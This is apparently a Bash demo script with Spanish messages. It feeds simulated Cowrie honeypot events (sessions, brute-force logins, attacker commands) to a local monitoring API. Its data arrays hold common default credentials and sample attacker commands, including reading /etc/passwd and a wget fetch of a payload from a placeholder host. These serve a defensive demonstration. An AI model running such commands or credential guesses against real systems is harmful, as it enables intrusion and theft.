#!/usr/bin/env bash
set -euo pipefail

if [[ -f .env ]]; then
  set -a
  # shellcheck disable=SC1091
  source .env
  set +a
fi

API_BASE_URL="${API_BASE_URL:-http://127.0.0.1:${API_PORT:-8000}}"
SHIPPER_TOKEN="${SHIPPER_TOKEN:-demo-secret-token}"
DEMO_TRAFFIC_DURATION="${DEMO_TRAFFIC_DURATION:-600}"
DEMO_TRAFFIC_INTERVAL="${DEMO_TRAFFIC_INTERVAL:-4}"

SRC_IPS=(
  "203.0.113.44"
  "198.51.100.20"
  "203.0.113.10"
  "192.0.2.88"
)

USERS=(
  "root"
  "admin"
  "test"
  "ubuntu"
  "postgres"
)

PASSWORDS=(
  "password"
  "admin123"
  "123456"
  "qwerty"
  "letmein"
)

COMMANDS=(
  "uname -a"
  "whoami"
  "cat /etc/passwd"
  "wget http://example.invalid/payload.sh"
  "curl http://example.invalid/check"
)

require_curl() {
  if ! command -v curl >/dev/null 2>&1; then
    echo "Error: curl no está instalado." >&2
    exit 1
  fi
}

healthcheck() {
  curl -fsS "${API_BASE_URL}/health" >/dev/null
}

json_string_or_null() {
  local value="${1:-}"
  if [[ -z "${value}" ]]; then
    printf 'null'
  else
    printf '"%s"' "${value//\"/\\\"}"
  fi
}

post_event() {
  local event_type="$1"
  local src_ip="$2"
  local username="${3:-}"
  local password="${4:-}"
  local command="${5:-}"
  local timestamp
  local username_json
  local password_json
  local command_json

  timestamp="$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
  username_json="$(json_string_or_null "${username}")"
  password_json="$(json_string_or_null "${password}")"
  command_json="$(json_string_or_null "${command}")"

  local payload
  payload="{
    \"event_time\": \"${timestamp}\",
    \"src_ip\": \"${src_ip}\",
    \"event_type\": \"${event_type}\",
    \"username\": ${username_json},
    \"password\": ${password_json},
    \"command\": ${command_json},
    \"raw_json\": {
      \"source\": \"scripts/demo-traffic.sh\",
      \"timestamp\": \"${timestamp}\",
      \"src_ip\": \"${src_ip}\",
      \"eventid\": \"${event_type}\",
      \"username\": ${username_json},
      \"password\": ${password_json},
      \"input\": ${command_json}
    }
  }"

  for attempt in 1 2 3; do
    if curl -fsS -X POST "${API_BASE_URL}/events" \
      -H "Authorization: Bearer ${SHIPPER_TOKEN}" \
      -H "Content-Type: application/json" \
      -d "${payload}" >/dev/null; then
      return 0
    fi

    echo "Aviso: POST /events falló (intento ${attempt}/3); reintentando..." >&2
    sleep 1
  done

  echo "Aviso: se omitió un evento ${event_type}; la demo continúa." >&2
  return 0
}

next_event() {
  local step="$1"
  local src_ip="${SRC_IPS[$((step % ${#SRC_IPS[@]}))]}"
  local user="${USERS[$((step % ${#USERS[@]}))]}"
  local password="${PASSWORDS[$((step % ${#PASSWORDS[@]}))]}"
  local command="${COMMANDS[$((step % ${#COMMANDS[@]}))]}"

  case $((step % 8)) in
    0)
      post_event "cowrie.session.connect" "${src_ip}"
      echo "[$(date +%H:%M:%S)] sesión nueva desde ${src_ip}"
      ;;
    1 | 2 | 3 | 5)
      post_event "cowrie.login.failed" "${src_ip}" "${user}" "${password}"
      echo "[$(date +%H:%M:%S)] login fallido ${user}/${password} desde ${src_ip}"
      ;;
    4)
      post_event "cowrie.login.success" "${src_ip}" "${user}" "${password}"
      echo "[$(date +%H:%M:%S)] login exitoso simulado ${user} desde ${src_ip}"
      ;;
    6)
      post_event "cowrie.command.input" "${src_ip}" "${user}" "" "${command}"
      echo "[$(date +%H:%M:%S)] comando simulado '${command}' desde ${src_ip}"
      ;;
    7)
      post_event "cowrie.session.closed" "${src_ip}"
      echo "[$(date +%H:%M:%S)] sesión cerrada desde ${src_ip}"
      ;;
  esac
}

main() {
  require_curl

  echo "Generando tráfico demo contra ${API_BASE_URL}"
  echo "Duración: ${DEMO_TRAFFIC_DURATION}s | intervalo: ${DEMO_TRAFFIC_INTERVAL}s"
  echo "Detén con Ctrl+C cuando termine la presentación."

  if ! healthcheck; then
    echo "Error: la API no responde en ${API_BASE_URL}/health." >&2
    echo "Levanta la demo con: docker compose up -d" >&2
    exit 1
  fi

  local end_time
  local step=0
  end_time=$(($(date +%s) + DEMO_TRAFFIC_DURATION))

  while [[ "$(date +%s)" -lt "${end_time}" ]]; do
    next_event "${step}"
    step=$((step + 1))
    sleep "${DEMO_TRAFFIC_INTERVAL}"
  done

  echo "Tráfico demo finalizado."
}

main "$@"
